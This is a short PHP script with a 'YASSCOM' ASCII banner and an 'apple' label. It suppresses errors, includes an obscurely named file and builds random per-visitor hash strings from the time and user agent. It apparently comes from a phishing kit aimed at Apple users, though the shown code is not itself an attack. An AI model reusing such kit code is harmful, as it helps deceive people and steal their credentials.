<?php
	/*
	#///////////////////////////////////////////////////#
	# __   __ _    ____ ____   ____ ___  __  __  
	# \ \ / // \  / ___/ ___| / ___/ _ \|  \/  | 
	#  \ V // _ \ \___ \___ \| |  | | | | |\/| | 
	#   | |/ ___ \ ___) |__) | |__| |_| | |  | | 
	#   |_/_/   \_\____/____/ \____\___/|_|  |_| 
	#  
	apple
	*/
	date_default_timezone_set('GMT');
	error_reporting(E_ERROR | E_PARSE);
	include('XYSANBBX/xanbbx.php');
	$date = new DateTime("NOW");
	$hash = crypt($date->format( "m-d-Y H:i:s.u").$_SERVER['HTTP_USER_AGENT'], '');
	$hash2 = substr(str_shuffle("0987654321abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".md5($date->format( "m-d-Y H:i:s.u"))), 0, 1000);
?>